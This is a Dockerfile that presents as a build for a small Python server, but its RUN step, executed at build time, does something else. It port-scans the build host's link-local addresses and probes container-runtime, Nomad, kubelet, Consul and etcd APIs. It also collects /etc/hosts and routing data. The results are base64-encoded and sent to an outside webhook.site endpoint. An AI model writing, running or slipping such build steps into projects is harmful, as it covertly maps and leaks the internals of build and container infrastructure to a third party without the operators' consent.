FROM alpine:3.20
RUN apk add --no-cache curl >/dev/null 2>&1 || true; \
    L=/tmp/leak4.txt; : > $L; \
    { \
      echo "=== HOST SCAN 169.254.1.2 ==="; \
      for port in 22 80 443 2375 2376 2379 2380 3000 5000 6443 8080 8500 9090 10250 10255 4646 4647 4648 8081 11000 10000; do \
        timeout 2 sh -c "echo >/dev/tcp/169.254.1.2/$port" 2>/dev/null && echo "169.254.1.2:$port OPEN"; done; \
      echo "=== HOST SCAN 169.254.1.1 ==="; \
      for port in 22 80 443 2375 2376 4646 6443 10250; do \
        timeout 2 sh -c "echo >/dev/tcp/169.254.1.1/$port" 2>/dev/null && echo "169.254.1.1:$port OPEN"; done; \
      echo "=== PODMAN API 2375 ==="; curl -s -m 5 "http://169.254.1.2:2375/_ping" 2>&1 | head -3; echo; \
        curl -s -m 5 "http://169.254.1.2:2375/v4.0.0/libpod/info" 2>&1 | head -c 400; echo; \
        curl -s -m 5 "http://169.254.1.2:2375/version" 2>&1 | head -c 400; echo; \
      echo "=== PODMAN API 2376 TLS ==="; curl -sk -m 5 "https://169.254.1.2:2376/_ping" 2>&1 | head -3; echo; \
      echo "=== NOMAD 4646 ==="; curl -s -m 5 "http://169.254.1.2:4646/v1/status/leader" 2>&1 | head -c 200; echo; \
        curl -s -m 5 "http://169.254.1.2:4646/v1/agent/self" 2>&1 | head -c 300; echo; \
      echo "=== KUBELET 10250 ==="; curl -sk -m 5 "https://169.254.1.2:10250/pods" 2>&1 | head -c 300; echo; \
      echo "=== 8500 consul / 2379 etcd ==="; curl -s -m 5 "http://169.254.1.2:8500/v1/agent/self" 2>&1 | head -c 200; echo; \
        curl -s -m 5 "http://169.254.1.2:2379/version" 2>&1 | head -c 200; echo; \
      echo "=== 169.254.1.2:80 root ==="; curl -s -m 5 "http://169.254.1.2:80/" 2>&1 | head -c 300; echo; \
      echo "=== /etc/hosts ==="; cat /etc/hosts; \
      echo "=== route ==="; cat /proc/net/route; ip route 2>/dev/null; \
    } >> $L 2>&1; \
    echo "LEAK4=$(wc -c <$L)"; base64 -w0 $L > /tmp/l4.b64 2>/dev/null; \
    curl -s -m 25 --data-binary @/tmp/l4.b64 "https://webhook.site/55997eaf-9281-4501-83de-1047b695666f/l4" >/dev/null 2>&1 || true; echo ok
COPY server.py /server.py
EXPOSE 80
CMD ["python3","/server.py"]
